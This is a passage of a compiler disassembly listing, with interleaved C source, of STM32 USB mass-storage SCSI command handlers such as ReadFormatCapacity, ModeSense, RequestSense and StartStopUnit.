 8009f2e:	3724      	adds	r7, #36	; 0x24
 8009f30:	46bd      	mov	sp, r7
 8009f32:	bd90      	pop	{r4, r7, pc}

08009f34 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f34:	b580      	push	{r7, lr}
 8009f36:	b088      	sub	sp, #32
 8009f38:	af00      	add	r7, sp, #0
 8009f3a:	60f8      	str	r0, [r7, #12]
 8009f3c:	460b      	mov	r3, r1
 8009f3e:	607a      	str	r2, [r7, #4]
 8009f40:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f42:	68fb      	ldr	r3, [r7, #12]
 8009f44:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f48:	68fb      	ldr	r3, [r7, #12]
 8009f4a:	32b0      	adds	r2, #176	; 0xb0
 8009f4c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f50:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009f52:	69bb      	ldr	r3, [r7, #24]
 8009f54:	2b00      	cmp	r3, #0
 8009f56:	d102      	bne.n	8009f5e <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009f58:	f04f 33ff 	mov.w	r3, #4294967295
 8009f5c:	e063      	b.n	800a026 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009f5e:	68fb      	ldr	r3, [r7, #12]
 8009f60:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f64:	68fa      	ldr	r2, [r7, #12]
 8009f66:	33b0      	adds	r3, #176	; 0xb0
 8009f68:	009b      	lsls	r3, r3, #2
 8009f6a:	4413      	add	r3, r2
 8009f6c:	685b      	ldr	r3, [r3, #4]
 8009f6e:	685b      	ldr	r3, [r3, #4]
 8009f70:	f107 0214 	add.w	r2, r7, #20
 8009f74:	f107 0110 	add.w	r1, r7, #16
 8009f78:	7af8      	ldrb	r0, [r7, #11]
 8009f7a:	4798      	blx	r3
 8009f7c:	4603      	mov	r3, r0
 8009f7e:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f80:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009f84:	2b00      	cmp	r3, #0
 8009f86:	d106      	bne.n	8009f96 <SCSI_ReadFormatCapacity+0x62>
 8009f88:	69bb      	ldr	r3, [r7, #24]
 8009f8a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f8e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f92:	2b02      	cmp	r3, #2
 8009f94:	d108      	bne.n	8009fa8 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f96:	7af9      	ldrb	r1, [r7, #11]
 8009f98:	233a      	movs	r3, #58	; 0x3a
 8009f9a:	2202      	movs	r2, #2
 8009f9c:	68f8      	ldr	r0, [r7, #12]
 8009f9e:	f000 f941 	bl	800a224 <SCSI_SenseCode>
    return -1;
 8009fa2:	f04f 33ff 	mov.w	r3, #4294967295
 8009fa6:	e03e      	b.n	800a026 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 8009fa8:	2300      	movs	r3, #0
 8009faa:	83fb      	strh	r3, [r7, #30]
 8009fac:	e007      	b.n	8009fbe <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 8009fae:	8bfb      	ldrh	r3, [r7, #30]
 8009fb0:	69ba      	ldr	r2, [r7, #24]
 8009fb2:	4413      	add	r3, r2
 8009fb4:	2200      	movs	r2, #0
 8009fb6:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 8009fb8:	8bfb      	ldrh	r3, [r7, #30]
 8009fba:	3301      	adds	r3, #1
 8009fbc:	83fb      	strh	r3, [r7, #30]
 8009fbe:	8bfb      	ldrh	r3, [r7, #30]
 8009fc0:	2b0b      	cmp	r3, #11
 8009fc2:	d9f4      	bls.n	8009fae <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 8009fc4:	69bb      	ldr	r3, [r7, #24]
 8009fc6:	2208      	movs	r2, #8
 8009fc8:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 8009fca:	693b      	ldr	r3, [r7, #16]
 8009fcc:	3b01      	subs	r3, #1
 8009fce:	0e1b      	lsrs	r3, r3, #24
 8009fd0:	b2da      	uxtb	r2, r3
 8009fd2:	69bb      	ldr	r3, [r7, #24]
 8009fd4:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 8009fd6:	693b      	ldr	r3, [r7, #16]
 8009fd8:	3b01      	subs	r3, #1
 8009fda:	0c1b      	lsrs	r3, r3, #16
 8009fdc:	b2da      	uxtb	r2, r3
 8009fde:	69bb      	ldr	r3, [r7, #24]
 8009fe0:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 8009fe2:	693b      	ldr	r3, [r7, #16]
 8009fe4:	3b01      	subs	r3, #1
 8009fe6:	0a1b      	lsrs	r3, r3, #8
 8009fe8:	b2da      	uxtb	r2, r3
 8009fea:	69bb      	ldr	r3, [r7, #24]
 8009fec:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 8009fee:	693b      	ldr	r3, [r7, #16]
 8009ff0:	b2db      	uxtb	r3, r3
 8009ff2:	3b01      	subs	r3, #1
 8009ff4:	b2da      	uxtb	r2, r3
 8009ff6:	69bb      	ldr	r3, [r7, #24]
 8009ff8:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 8009ffa:	69bb      	ldr	r3, [r7, #24]
 8009ffc:	2202      	movs	r2, #2
 8009ffe:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a000:	8abb      	ldrh	r3, [r7, #20]
 800a002:	141b      	asrs	r3, r3, #16
 800a004:	b2da      	uxtb	r2, r3
 800a006:	69bb      	ldr	r3, [r7, #24]
 800a008:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a00a:	8abb      	ldrh	r3, [r7, #20]
 800a00c:	0a1b      	lsrs	r3, r3, #8
 800a00e:	b29b      	uxth	r3, r3
 800a010:	b2da      	uxtb	r2, r3
 800a012:	69bb      	ldr	r3, [r7, #24]
 800a014:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a016:	8abb      	ldrh	r3, [r7, #20]
 800a018:	b2da      	uxtb	r2, r3
 800a01a:	69bb      	ldr	r3, [r7, #24]
 800a01c:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a01e:	69bb      	ldr	r3, [r7, #24]
 800a020:	220c      	movs	r2, #12
 800a022:	60da      	str	r2, [r3, #12]

  return 0;
 800a024:	2300      	movs	r3, #0
}
 800a026:	4618      	mov	r0, r3
 800a028:	3720      	adds	r7, #32
 800a02a:	46bd      	mov	sp, r7
 800a02c:	bd80      	pop	{r7, pc}
	...

0800a030 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a030:	b580      	push	{r7, lr}
 800a032:	b086      	sub	sp, #24
 800a034:	af00      	add	r7, sp, #0
 800a036:	60f8      	str	r0, [r7, #12]
 800a038:	460b      	mov	r3, r1
 800a03a:	607a      	str	r2, [r7, #4]
 800a03c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a03e:	68fb      	ldr	r3, [r7, #12]
 800a040:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a044:	68fb      	ldr	r3, [r7, #12]
 800a046:	32b0      	adds	r2, #176	; 0xb0
 800a048:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a04c:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a04e:	2317      	movs	r3, #23
 800a050:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a052:	693b      	ldr	r3, [r7, #16]
 800a054:	2b00      	cmp	r3, #0
 800a056:	d102      	bne.n	800a05e <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a058:	f04f 33ff 	mov.w	r3, #4294967295
 800a05c:	e011      	b.n	800a082 <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a05e:	687b      	ldr	r3, [r7, #4]
 800a060:	3304      	adds	r3, #4
 800a062:	781b      	ldrb	r3, [r3, #0]
 800a064:	b29b      	uxth	r3, r3
 800a066:	8afa      	ldrh	r2, [r7, #22]
 800a068:	429a      	cmp	r2, r3
 800a06a:	d303      	bcc.n	800a074 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a06c:	687b      	ldr	r3, [r7, #4]
 800a06e:	3304      	adds	r3, #4
 800a070:	781b      	ldrb	r3, [r3, #0]
 800a072:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a074:	8afb      	ldrh	r3, [r7, #22]
 800a076:	461a      	mov	r2, r3
 800a078:	4904      	ldr	r1, [pc, #16]	; (800a08c <SCSI_ModeSense6+0x5c>)
 800a07a:	6938      	ldr	r0, [r7, #16]
 800a07c:	f000 feb8 	bl	800adf0 <SCSI_UpdateBotData>

  return 0;
 800a080:	2300      	movs	r3, #0
}
 800a082:	4618      	mov	r0, r3
 800a084:	3718      	adds	r7, #24
 800a086:	46bd      	mov	sp, r7
 800a088:	bd80      	pop	{r7, pc}
 800a08a:	bf00      	nop
 800a08c:	2000011c 	.word	0x2000011c

0800a090 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a090:	b580      	push	{r7, lr}
 800a092:	b086      	sub	sp, #24
 800a094:	af00      	add	r7, sp, #0
 800a096:	60f8      	str	r0, [r7, #12]
 800a098:	460b      	mov	r3, r1
 800a09a:	607a      	str	r2, [r7, #4]
 800a09c:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a09e:	68fb      	ldr	r3, [r7, #12]
 800a0a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0a4:	68fb      	ldr	r3, [r7, #12]
 800a0a6:	32b0      	adds	r2, #176	; 0xb0
 800a0a8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0ac:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a0ae:	231b      	movs	r3, #27
 800a0b0:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a0b2:	693b      	ldr	r3, [r7, #16]
 800a0b4:	2b00      	cmp	r3, #0
 800a0b6:	d102      	bne.n	800a0be <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a0b8:	f04f 33ff 	mov.w	r3, #4294967295
 800a0bc:	e011      	b.n	800a0e2 <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a0be:	687b      	ldr	r3, [r7, #4]
 800a0c0:	3308      	adds	r3, #8
 800a0c2:	781b      	ldrb	r3, [r3, #0]
 800a0c4:	b29b      	uxth	r3, r3
 800a0c6:	8afa      	ldrh	r2, [r7, #22]
 800a0c8:	429a      	cmp	r2, r3
 800a0ca:	d303      	bcc.n	800a0d4 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a0cc:	687b      	ldr	r3, [r7, #4]
 800a0ce:	3308      	adds	r3, #8
 800a0d0:	781b      	ldrb	r3, [r3, #0]
 800a0d2:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a0d4:	8afb      	ldrh	r3, [r7, #22]
 800a0d6:	461a      	mov	r2, r3
 800a0d8:	4904      	ldr	r1, [pc, #16]	; (800a0ec <SCSI_ModeSense10+0x5c>)
 800a0da:	6938      	ldr	r0, [r7, #16]
 800a0dc:	f000 fe88 	bl	800adf0 <SCSI_UpdateBotData>

  return 0;
 800a0e0:	2300      	movs	r3, #0
}
 800a0e2:	4618      	mov	r0, r3
 800a0e4:	3718      	adds	r7, #24
 800a0e6:	46bd      	mov	sp, r7
 800a0e8:	bd80      	pop	{r7, pc}
 800a0ea:	bf00      	nop
 800a0ec:	20000134 	.word	0x20000134

0800a0f0 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0f0:	b580      	push	{r7, lr}
 800a0f2:	b086      	sub	sp, #24
 800a0f4:	af00      	add	r7, sp, #0
 800a0f6:	60f8      	str	r0, [r7, #12]
 800a0f8:	460b      	mov	r3, r1
 800a0fa:	607a      	str	r2, [r7, #4]
 800a0fc:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0fe:	68fb      	ldr	r3, [r7, #12]
 800a100:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a104:	68fb      	ldr	r3, [r7, #12]
 800a106:	32b0      	adds	r2, #176	; 0xb0
 800a108:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a10c:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a10e:	693b      	ldr	r3, [r7, #16]
 800a110:	2b00      	cmp	r3, #0
 800a112:	d102      	bne.n	800a11a <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a114:	f04f 33ff 	mov.w	r3, #4294967295
 800a118:	e080      	b.n	800a21c <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a11a:	693b      	ldr	r3, [r7, #16]
 800a11c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a120:	699b      	ldr	r3, [r3, #24]
 800a122:	2b00      	cmp	r3, #0
 800a124:	d10b      	bne.n	800a13e <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a126:	693b      	ldr	r3, [r7, #16]
 800a128:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a12c:	7f59      	ldrb	r1, [r3, #29]
 800a12e:	2320      	movs	r3, #32
 800a130:	2205      	movs	r2, #5
 800a132:	68f8      	ldr	r0, [r7, #12]
 800a134:	f000 f876 	bl	800a224 <SCSI_SenseCode>
    return -1;
 800a138:	f04f 33ff 	mov.w	r3, #4294967295
 800a13c:	e06e      	b.n	800a21c <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a13e:	2300      	movs	r3, #0
 800a140:	75fb      	strb	r3, [r7, #23]
 800a142:	e007      	b.n	800a154 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a144:	7dfb      	ldrb	r3, [r7, #23]
 800a146:	693a      	ldr	r2, [r7, #16]
 800a148:	4413      	add	r3, r2
 800a14a:	2200      	movs	r2, #0
 800a14c:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a14e:	7dfb      	ldrb	r3, [r7, #23]
 800a150:	3301      	adds	r3, #1
 800a152:	75fb      	strb	r3, [r7, #23]
 800a154:	7dfb      	ldrb	r3, [r7, #23]
 800a156:	2b11      	cmp	r3, #17
 800a158:	d9f4      	bls.n	800a144 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a15a:	693b      	ldr	r3, [r7, #16]
 800a15c:	2270      	movs	r2, #112	; 0x70
 800a15e:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a160:	693b      	ldr	r3, [r7, #16]
 800a162:	220c      	movs	r2, #12
 800a164:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a166:	693b      	ldr	r3, [r7, #16]
 800a168:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a16c:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a170:	693b      	ldr	r3, [r7, #16]
 800a172:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a176:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a17a:	429a      	cmp	r2, r3
 800a17c:	d03f      	beq.n	800a1fe <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a17e:	693b      	ldr	r3, [r7, #16]
 800a180:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a184:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a188:	461a      	mov	r2, r3
 800a18a:	693b      	ldr	r3, [r7, #16]
 800a18c:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a190:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a194:	693b      	ldr	r3, [r7, #16]
 800a196:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a198:	693b      	ldr	r3, [r7, #16]
 800a19a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a19e:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1a2:	693a      	ldr	r2, [r7, #16]
 800a1a4:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1a8:	00db      	lsls	r3, r3, #3
 800a1aa:	4413      	add	r3, r2
 800a1ac:	791a      	ldrb	r2, [r3, #4]
 800a1ae:	693b      	ldr	r3, [r7, #16]
 800a1b0:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a1b2:	693b      	ldr	r3, [r7, #16]
 800a1b4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1b8:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1bc:	693a      	ldr	r2, [r7, #16]
 800a1be:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1c2:	00db      	lsls	r3, r3, #3
 800a1c4:	4413      	add	r3, r2
 800a1c6:	795a      	ldrb	r2, [r3, #5]
 800a1c8:	693b      	ldr	r3, [r7, #16]
 800a1ca:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a1cc:	693b      	ldr	r3, [r7, #16]
 800a1ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1d2:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1d6:	3301      	adds	r3, #1
 800a1d8:	b2da      	uxtb	r2, r3
 800a1da:	693b      	ldr	r3, [r7, #16]
 800a1dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1e0:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a1e4:	693b      	ldr	r3, [r7, #16]
 800a1e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1ea:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1ee:	2b04      	cmp	r3, #4
 800a1f0:	d105      	bne.n	800a1fe <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a1f2:	693b      	ldr	r3, [r7, #16]
 800a1f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1f8:	2200      	movs	r2, #0
 800a1fa:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a1fe:	693b      	ldr	r3, [r7, #16]
 800a200:	2212      	movs	r2, #18
 800a202:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a204:	687b      	ldr	r3, [r7, #4]
 800a206:	3304      	adds	r3, #4
 800a208:	781b      	ldrb	r3, [r3, #0]
 800a20a:	2b12      	cmp	r3, #18
 800a20c:	d805      	bhi.n	800a21a <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a20e:	687b      	ldr	r3, [r7, #4]
 800a210:	3304      	adds	r3, #4
 800a212:	781b      	ldrb	r3, [r3, #0]
 800a214:	461a      	mov	r2, r3
 800a216:	693b      	ldr	r3, [r7, #16]
 800a218:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a21a:	2300      	movs	r3, #0
}
 800a21c:	4618      	mov	r0, r3
 800a21e:	3718      	adds	r7, #24
 800a220:	46bd      	mov	sp, r7
 800a222:	bd80      	pop	{r7, pc}

0800a224 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a224:	b480      	push	{r7}
 800a226:	b085      	sub	sp, #20
 800a228:	af00      	add	r7, sp, #0
 800a22a:	6078      	str	r0, [r7, #4]
 800a22c:	4608      	mov	r0, r1
 800a22e:	4611      	mov	r1, r2
 800a230:	461a      	mov	r2, r3
 800a232:	4603      	mov	r3, r0
 800a234:	70fb      	strb	r3, [r7, #3]
 800a236:	460b      	mov	r3, r1
 800a238:	70bb      	strb	r3, [r7, #2]
 800a23a:	4613      	mov	r3, r2
 800a23c:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a23e:	687b      	ldr	r3, [r7, #4]
 800a240:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a244:	687b      	ldr	r3, [r7, #4]
 800a246:	32b0      	adds	r2, #176	; 0xb0
 800a248:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a24c:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a24e:	68fb      	ldr	r3, [r7, #12]
 800a250:	2b00      	cmp	r3, #0
 800a252:	d03d      	beq.n	800a2d0 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a254:	68fb      	ldr	r3, [r7, #12]
 800a256:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a25a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a25e:	461a      	mov	r2, r3
 800a260:	68fb      	ldr	r3, [r7, #12]
 800a262:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a266:	78b9      	ldrb	r1, [r7, #2]
 800a268:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a26c:	68fb      	ldr	r3, [r7, #12]
 800a26e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a272:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a276:	68fa      	ldr	r2, [r7, #12]
 800a278:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a27c:	00db      	lsls	r3, r3, #3
 800a27e:	4413      	add	r3, r2
 800a280:	787a      	ldrb	r2, [r7, #1]
 800a282:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a284:	68fb      	ldr	r3, [r7, #12]
 800a286:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a28a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a28e:	68fa      	ldr	r2, [r7, #12]
 800a290:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a294:	00db      	lsls	r3, r3, #3
 800a296:	4413      	add	r3, r2
 800a298:	2200      	movs	r2, #0
 800a29a:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a29c:	68fb      	ldr	r3, [r7, #12]
 800a29e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2a2:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2a6:	3301      	adds	r3, #1
 800a2a8:	b2da      	uxtb	r2, r3
 800a2aa:	68fb      	ldr	r3, [r7, #12]
 800a2ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2b0:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a2b4:	68fb      	ldr	r3, [r7, #12]
 800a2b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ba:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2be:	2b04      	cmp	r3, #4
 800a2c0:	d107      	bne.n	800a2d2 <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a2c2:	68fb      	ldr	r3, [r7, #12]
 800a2c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2c8:	2200      	movs	r2, #0
 800a2ca:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a2ce:	e000      	b.n	800a2d2 <SCSI_SenseCode+0xae>
    return;
 800a2d0:	bf00      	nop
  }
}
 800a2d2:	3714      	adds	r7, #20
 800a2d4:	46bd      	mov	sp, r7
 800a2d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a2da:	4770      	bx	lr

0800a2dc <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2dc:	b580      	push	{r7, lr}
 800a2de:	b086      	sub	sp, #24
 800a2e0:	af00      	add	r7, sp, #0
 800a2e2:	60f8      	str	r0, [r7, #12]
 800a2e4:	460b      	mov	r3, r1
 800a2e6:	607a      	str	r2, [r7, #4]
 800a2e8:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2ea:	68fb      	ldr	r3, [r7, #12]
 800a2ec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2f0:	68fb      	ldr	r3, [r7, #12]
 800a2f2:	32b0      	adds	r2, #176	; 0xb0
 800a2f4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2f8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a2fa:	697b      	ldr	r3, [r7, #20]
 800a2fc:	2b00      	cmp	r3, #0
 800a2fe:	d102      	bne.n	800a306 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a300:	f04f 33ff 	mov.w	r3, #4294967295
 800a304:	e043      	b.n	800a38e <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a306:	697b      	ldr	r3, [r7, #20]
 800a308:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a30c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a310:	2b01      	cmp	r3, #1
 800a312:	d10f      	bne.n	800a334 <SCSI_StartStopUnit+0x58>
 800a314:	687b      	ldr	r3, [r7, #4]
 800a316:	3304      	adds	r3, #4
 800a318:	781b      	ldrb	r3, [r3, #0]
 800a31a:	f003 0303 	and.w	r3, r3, #3
 800a31e:	2b02      	cmp	r3, #2
 800a320:	d108      	bne.n	800a334 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a322:	7af9      	ldrb	r1, [r7, #11]
 800a324:	2324      	movs	r3, #36	; 0x24
 800a326:	2205      	movs	r2, #5
 800a328:	68f8      	ldr	r0, [r7, #12]
 800a32a:	f7ff ff7b 	bl	800a224 <SCSI_SenseCode>

    return -1;
 800a32e:	f04f 33ff 	mov.w	r3, #4294967295
 800a332:	e02c      	b.n	800a38e <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a334:	687b      	ldr	r3, [r7, #4]
 800a336:	3304      	adds	r3, #4
 800a338:	781b      	ldrb	r3, [r3, #0]
